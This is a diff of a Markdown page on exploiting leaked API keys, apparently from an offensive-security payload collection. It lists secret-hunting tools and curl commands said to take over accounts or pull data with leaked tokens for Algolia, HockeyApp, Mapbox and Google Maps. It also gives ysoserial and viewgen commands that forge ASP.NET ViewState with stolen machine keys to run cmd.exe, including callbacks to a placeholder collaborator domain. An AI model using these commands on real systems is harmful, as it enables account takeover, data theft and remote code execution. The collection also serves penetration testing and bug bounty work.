@@ -1,29 +1,48 @@
 +++
 title = "API Key Leaks"
-date = "2022-10-16"
+date = "2023-03-28"
 description = "Tips and tricks for sniffing out API key leaks; where to look and how to find them."
+include_toc = 'true'
 +++
+
 # API Key Leaks
 
 > The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.
+## Summary
+
+- [Tools](#tools)
+- [Exploit](#exploit)
+    - [Google Maps](#google-maps)
+    - [Algolia](#algolia)
+    - [AWS Access Key ID & Secret](#aws-access-key-id--secret)
+    - [Slack API Token](#slack-api-token)
+    - [Facebook Access Token](#facebook-access-token)
+    - [Github client id and client secret](#github-client-id-and-client-secret)
+    - [Twilio Account_sid and Auth Token](#twilio-account_sid-and-auth-token)
+    - [Twitter API Secret](#twitter-api-secret)
+    - [Twitter Bearer Token](#twitter-bearer-token)
+    - [Gitlab Personal Access Token](#gitlab-personal-access-token)
+    - [HockeyApp API Token](#hockeyapp-api-token)
+    - [IIS Machine Keys](#iis-machine-keys)
+    - [Mapbox API Token](#Mapbox-API-Token)
 
 
 ## Tools
 
 - [KeyFinder - is a tool that let you find keys while surfing the web!](https://github.com/momenbasel/KeyFinder)
-- [Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid.](https://github.com/streaak/keyhacks)
-- [truffleHog - Find credentials all over the place](https://github.com/trufflesecurity/truffleHog)
-    ```bash
+- [KeyHacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid.](https://github.com/streaak/keyhacks)
+- [TruffleHog - Find credentials all over the place](https://github.com/trufflesecurity/truffleHog)
+    ```ps1
     docker run -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys
     docker run -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=trufflesecurity
     trufflehog git https://github.com/trufflesecurity/trufflehog.git
     trufflehog github --endpoint https://api.github.com --org trufflesecurity --token GITHUB_TOKEN --debug --concurrency 2
     ```
+- [Trivy - General purpose vulnerability and misconfiguration scanner which also searches for API keys/secrets](https://github.com/aquasecurity/trivy)
 
 ## Exploit
 
 The following commands can be used to takeover accounts or extract personal information from the API using the leaked token.
-
 
 ### Google Maps
 
@@ -33,16 +52,16 @@ Usage:
 |   Name   |   Endpoint   |
 |   ---    |    --- |
 |   Static Maps    |   https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key=KEY_HERE   |
-|   Streetview |	https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key=KEY_HERE |
-|   Embed  |	https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&key=KEY_HERE  |
-|   Directions |	https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=KEY_HERE    |
-|   Geocoding  |	https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=KEY_HERE |
-|   Distance Matrix    |	https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=KEY_HERE   |
-|   Find Place from Text   |	https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE    |
-|   Autocomplete   |	https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=KEY_HERE    |
-|   Elevation  |	https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=KEY_HERE  |
-|   Timezone   |	https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY_HERE   |
-|   Roads  |	https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795|60.170879,24.942796|60.170877,24.942796&key=KEY_HERE    |
+|   Streetview |    https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key=KEY_HERE |
+|   Embed  |    https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&key=KEY_HERE  |
+|   Directions |    https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=KEY_HERE    |
+|   Geocoding  |    https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=KEY_HERE |
+|   Distance Matrix    |    https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=KEY_HERE   |
+|   Find Place from Text   |    https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE    |
+|   Autocomplete   |    https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=KEY_HERE    |
+|   Elevation  |    https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=KEY_HERE  |
+|   Timezone   |    https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY_HERE   |
+|   Roads  |    https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795|60.170879,24.942796|60.170877,24.942796&key=KEY_HERE    |
 |   Geolocate  |   https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE |
 
 
@@ -52,7 +71,7 @@ Impact:
 
 ### Algolia
 
-```bash
+```powershell
 curl --request PUT \
   --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \
   --header 'content-type: application/json' \
@@ -114,7 +133,6 @@ curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hoc
 ### IIS Machine Keys
 
 > That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.
-
 Requirements
 * machineKey **validationKey** and **decryptionKey**
 * __VIEWSTATEGENERATOR cookies
@@ -134,7 +152,7 @@ Common locations of **web.config** / **machine.config**
     * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config
     * C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config
 * in registry when **AutoGenerate** is enabled (extract with https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab)
-    * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4  
+    * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4
     * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey
 
 
@@ -149,7 +167,6 @@ Common locations of **web.config** / **machine.config**
 $ viewgen --guess "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
 [+] ViewState is not encrypted
 [+] Signature algorithm: SHA1
-
 # --encrypteddata : __VIEWSTATE parameter value of the target application
 # --modifier : __VIEWSTATEGENERATOR parameter value
 $ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> –macdecode
@@ -159,9 +176,7 @@ $ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate
 
 ```powershell
 $ viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
-
 $ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate  --modifier=CA0B0334 --macdecode
-
 $ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"
 ```
 
@@ -174,7 +189,6 @@ $ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyM
 $ ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "cmd.exe /c nslookup <your collab domain>"  --decryptionalg="AES" --generator=ABABABAB decryptionkey="<decryption key>"  --validationalg="SHA1" --validationkey="<validation key>"
 $ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\pwn.txt" --generator="CA0B0334" --validationalg="MD5" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
 $ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "C:\Users\zhu\Desktop\ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll" --generator="CA0B0334" --validationalg="SHA1" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
-
 $ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
 ```
 
@@ -188,7 +202,6 @@ ASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptT
 ```powershell
 # decrypt cookie
 $ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes
-
 # encrypt cookie (edit Decrypted.txt)
 $ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
 ```
@@ -198,7 +211,6 @@ A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is `sk`, 
 ```
 #Check token validity
 curl "https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
-
 #Get list of all tokens associated with an account. (only works if the token is a Secret Token (sk), and has the appropiate scope)
 curl "https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
 ```
